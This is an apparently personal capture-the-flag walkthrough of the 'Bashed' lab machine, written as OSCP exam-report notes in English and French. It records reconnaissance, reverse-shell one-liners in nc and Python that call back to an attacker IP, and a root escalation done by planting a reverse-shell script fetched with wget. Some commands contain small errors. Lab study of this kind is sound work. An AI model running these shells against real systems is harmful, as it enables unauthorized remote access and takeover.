---
title: "Offensive Security Certified Professional Exam Report"
author: ["your@mail.com", "OSID: XXXX"]
date: "2021-01-05"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "OSCP Exam Report"
lang: "en"
titlepage: true,
titlepage-rule-color: "360049"
titlepage-rule-height: 2
titlepage-background: "backgrounds/background1.pdf"
book: true
classoption: oneside
code-block-font-size: \scriptsize
---

# Bashed

https://ranakhalil101.medium.com/my-oscp-journey-a-review-fa779b4339d9

## Info
attacking machine 10.10.14.8
victim machine 10.129.37.105

mkdir nmap

## easy scan
```
sudo nmap -sC -sV -O -oA nmap/initial 10.129.37.105
```

    -sC: run default nmap scripts
    -sV: detect service version
    -O: detect OS
    -oA: output all formats and store in file nmap/initial

## All port scan in tcp
```
sudo nmap -sC -sV -O -p1-65535 -oA nmap/full 10.129.37.105   

```

## All port scan in udp

```
sudo nmap -sC -sV -O -p1-65535 -oA nmap/full 10.129.37.105

```

## Brute force all directories
```
sudo apt install gobuster
gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.37.105

```

http://10.129.37.105/dev/phpbash.php

## identify the system
whoami
id
uname -a

## netcat

- on 42
nc -nlvp 4444

- on victim
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 10.10.14.8 4444 1>/tmp/backpipe

or
nc -nv 10.10.14.8 4444 -e /bin/sh

- alternative with Python
which python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## Find flag
cd /home/arrexel
cat user.txt


## more

sudo -l
-> scriptmanager nopasswd needed...

cd /
ls -la
on voit qu' il y a le repertoire scripts qui est scripmanager

sudo -i -u scriptmanager

pas besoin de mot de passe
cd /scripts
et on voit que l' on peut executer un script python

## Privilege escalation

create other.py
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((“10.10.14.8”,5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);
```

chmod 777 test.py

python -m SimpleHTTPServer 8000

sur la machine victime dans le repertoire de scripts
wget http://10.10.10.8:8000/test.py

apres lancer un autre nc
nc -lnvp 5555

qui lui sera executer en root
cd /root
cat root.txt


## A creuser

dans le pdf, lors de la premiere connexion sur nc 
python -c 'import pty; pty.spawn("/bin/bash");'
semble afficher le repertoire "dev" 
stty raw -echo
(desactive le retour)